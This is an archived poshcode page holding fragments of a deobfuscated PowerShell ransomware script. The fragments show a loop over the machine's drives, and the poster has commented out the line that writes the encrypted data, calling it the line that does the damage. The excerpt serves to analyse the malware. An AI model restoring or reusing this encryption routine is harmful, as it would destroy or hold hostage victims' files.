...
children:       
poster:         DJ0101
title:          PowerShell Crypto Ransom
date:           2015-07-28 08:14:18
description:    A deobfuscated version of http://poshcode.org/5933
Update: commented out the actual data write line in case someone decides to run this on their machine.
format:         posh
---

# PowerShell Crypto Ransom

### [download](5946.ps1) [parent](5941.md) 
...
$GxjsdjfRxncjRgsjd = ThsnncGhjsjcHhjdjRghsjj #meaningless. I think they meant to create a variable with the b64 value below
...
$drives = gdr | where {$_.Free} | Sort-Object -Descending 
  foreach($drive in $drives){ 
	...
	# Following line is what does the damage. Commenting out in case someone doesn't realise and tries to run this upload.
	# $binary_writer.Write($mem_array,0,$mem_array.Length)
        $binary_writer.Close()
